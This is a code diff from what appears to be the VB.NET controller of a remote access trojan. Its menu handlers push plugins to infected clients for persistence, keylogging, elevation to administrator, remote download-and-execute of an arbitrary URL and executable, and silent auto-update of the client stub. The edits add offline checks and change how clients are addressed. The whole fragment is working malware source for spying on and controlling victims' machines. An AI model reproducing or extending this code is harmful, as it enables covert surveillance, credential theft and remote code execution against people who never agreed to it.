+                            S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-|'P'|3")
+                            x.BackColor = Color.DarkSlateGray
+                        End If
+                    Else
+                        S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-|'P'|3")
                         x.BackColor = Color.DarkSlateGray
                     End If
-                Else
-                    S.Send(x.ToolTipText, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-|'P'|3")
-                    x.BackColor = Color.DarkSlateGray
                 End If
             Next
         Catch ex As Exception
@@ -1632,8 +1732,10 @@ Public Class Main
     Private Sub PersistenceToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PersistenceToolStripMenuItem.Click
         Try
             For Each x As ListViewItem In L1.SelectedItems
-                S.Send(x.ToolTipText, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PERS.dll"), True)) + SPL + " ")
-                x.BackColor = Color.DarkSlateGray
+                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PERS.dll"), True)) + SPL + " ")
+                    x.BackColor = Color.DarkSlateGray
+                End If
             Next
         Catch ex As Exception
             MsgBox(ex.Message, MsgBoxStyle.Critical)
@@ -1645,8 +1747,8 @@ Public Class Main
         Try
             For Each x As ListViewItem In L1.SelectedItems
                 Dim KL As File_Manager = My.Application.OpenForms("KL" + x.SubItems(ID.Index).Text)
-                If KL Is Nothing Then
-                    S.Send(x.ToolTipText, "KL")
+                If KL Is Nothing AndAlso Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    S.Send(x.Tag, "KL")
                     x.BackColor = Color.DarkSlateGray
                 End If
             Next
@@ -1670,8 +1772,10 @@ Public Class Main
                 Dim CMD = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + PLG + SPL + "RD-|'P'|" + IO.Path.GetFileName(o.FileName) + "|'P'|" + F))
                 MS.Write(CMD, 0, CMD.Length)
                 For Each x As ListViewItem In L1.SelectedItems
-                    S.SendData(x.ToolTipText, MS.ToArray)
-                    x.BackColor = Color.DarkSlateGray
+                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                        S.SendData(x.Tag, MS.ToArray)
+                        x.BackColor = Color.DarkSlateGray
+                    End If
                 Next
                 MS.Dispose()
             End If
@@ -1690,8 +1794,10 @@ Public Class Main
                 Exit Sub
             Else
                 For Each x As ListViewItem In L1.SelectedItems
-                    S.Send(x.ToolTipText, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "RU-|'P'|" + URL.ToString + "|'P'|" + EXE.ToString)
-                    x.BackColor = Color.DarkSlateGray
+                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                        S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "RU-|'P'|" + URL.ToString + "|'P'|" + EXE.ToString)
+                        x.BackColor = Color.DarkSlateGray
+                    End If
                 Next
             End If
         Catch ex As Exception
@@ -1711,8 +1817,10 @@ Public Class Main
                     URL = "http://" + URL
                 End If
                 For Each x As ListViewItem In L1.SelectedItems
-                    S.Send(x.ToolTipText, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "Visit|'P'|" + URL)
-                    x.BackColor = Color.DarkSlateGray
+                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                        S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "Visit|'P'|" + URL)
+                        x.BackColor = Color.DarkSlateGray
+                    End If
                 Next
             End If
         Catch ex As Exception
@@ -1724,8 +1832,10 @@ Public Class Main
     Private Sub RunAsAdministratorToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RunAsAdministratorToolStripMenuItem.Click
         Try
             For Each x As ListViewItem In L1.SelectedItems
-                S.Send(x.ToolTipText, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "PRI|'P'|")
-                x.BackColor = Color.DarkSlateGray
+                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "PRI|'P'|")
+                    x.BackColor = Color.DarkSlateGray
+                End If
             Next
         Catch ex As Exception
             MsgBox(ex.Message, MsgBoxStyle.Critical)
@@ -1783,20 +1893,22 @@ Public Class Main
     End Sub
 
     Public ClientEXE As String
-    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
+    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles AutoUpdate.Tick
         For Each x As ListViewItem In L1.Items
-            If x.SubItems(VER.Index).Text <> S_Settings.StubVer Then
-                S.Send(x.ToolTipText, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-" + "|'P'|" + "4" + "|'P'|" + IO.Path.GetFileName(ClientEXE) + "|'P'|" + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(ClientEXE), True)))
+            If x.SubItems(VER.Index).Text <> S_Settings.StubVer AndAlso Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PCL.dll"), True)) + SPL + "CL-" + "|'P'|" + "4" + "|'P'|" + IO.Path.GetFileName(ClientEXE) + "|'P'|" + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(ClientEXE), True)))
                 Messages(x.SubItems(IP.Index).Text, "Updated to [" + S_Settings.StubVer + "] using Auto-Update")
             End If
         Next
     End Sub
 
     'Ping all clients
-    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
+    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles PingClients.Tick
         Try
             For Each x As ListViewItem In L1.Items
-                S.Send(x.ToolTipText, "!PSend")
+                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
+                    S.Send(x.Tag, "!PSend")
+                End If
             Next
         Catch : End Try
     End Sub
@@ -2050,6 +2162,8 @@ Public Class Main
             MsgBox(ex.Message, MsgBoxStyle.Exclamation)
         End Try
     End Sub
+
+
 
 
 #End Region
